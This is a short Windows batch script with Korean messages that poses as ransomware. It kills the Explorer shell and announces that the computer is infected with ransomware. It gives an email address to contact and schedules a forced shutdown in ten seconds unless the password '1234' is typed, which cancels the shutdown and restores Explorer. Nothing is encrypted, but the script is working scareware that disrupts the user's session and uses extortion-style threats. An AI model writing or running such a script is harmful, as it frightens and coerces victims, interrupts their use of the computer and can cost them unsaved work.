@echo off
taskkill /f /im explorer.exe
echo 당신의 컴퓨터는 랜섬웨어에 감염됬습니다.
echo ababab@naver.com 연락을 주세요
echo 암호를 10초 안에 입력하지 않으면 컴퓨터가 꺼집니다.
shutdown /s /t 10

:A
set /p password=입력:
if %password%==1234 goto C

:B
echo 비밀번호가 틀립니다
goto A

:C
cls
echo 이제 컴퓨터를 사용하실수 있습니다.
pause
shutdown /a
start C:\Windows\explorer.exe
exit